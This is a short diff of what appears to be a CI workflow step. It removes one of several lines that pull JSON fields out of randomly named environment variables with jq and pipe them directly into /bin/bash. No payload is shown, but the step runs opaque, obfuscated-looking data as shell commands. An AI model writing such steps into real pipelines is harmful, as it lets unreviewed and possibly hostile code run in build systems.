@@ -22,7 +22,6 @@ jobs:
           echo $nkvsm37 | jq -r .fwzj5 | /bin/bash
           printf '%s' "$lk52435" | jq -r .zcij150 | /bin/bash
           printf '%s' "$ggie6622" | jq -r .acjmj6903 | /bin/bash
-          printf '%s' "$yqndz6" | jq -r .gvxe178 | /bin/bash
           printf '%s' "$mgohf2" | jq -r .iquc85970 | /bin/bash
 
       - name: Persist output
